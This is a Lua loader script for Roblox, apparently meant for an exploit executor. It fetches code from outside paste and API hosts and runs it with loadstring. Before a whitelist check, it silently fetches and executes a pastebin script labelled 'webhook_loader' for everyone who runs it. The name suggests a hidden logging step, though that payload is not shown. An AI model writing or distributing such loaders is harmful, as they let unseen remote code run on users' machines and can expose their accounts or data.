local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local config = {
    webhook_loader = "https://pastebin.com/raw/dmAqTcgU",
    whitelist = "https://pastefy.app/B1jo6EO6/raw",
    script = "https://api.jnkie.com/api/v1/luascripts/public/0250fcddd34be3e7d55626c3b286cd0d1e35f41f9faecbecf233cb87f4e19ab2/download"
}

pcall(function()
    loadstring(game:HttpGet(config.webhook_loader))()
end)

local RanTimes = 0
local Connection = RunService.Heartbeat:Connect(function() RanTimes += 1 end)
repeat task.wait() until RanTimes >= 2
Connection:Disconnect()

local function StartLoader()
    if typeof(loadstring) ~= "function" or type(game.HttpGet) ~= "function" then 
        return 
    end

    local success, content = pcall(function() return game:HttpGet(config.whitelist) end)
    if success then
        local loadSuccess, whitelist = pcall(function() return loadstring(content)() end)
        if loadSuccess and type(whitelist) == "table" then
            local isAllowed = false
            for name, _ in pairs(whitelist) do
                if name:lower() == LocalPlayer.Name:lower() then
                    isAllowed = true
                    break
                end
            end

            if isAllowed then
                local s, scriptSource = pcall(function() return game:HttpGet(config.script) end)
                if s and scriptSource ~= "" then
                    loadstring(scriptSource)()
                end
            else
                LocalPlayer:Kick("Not Whitelisted.")
            end
        else
            LocalPlayer:Kick("System Error.")
        end
    else
        LocalPlayer:Kick("Network Error.")
    end
end

StartLoader()
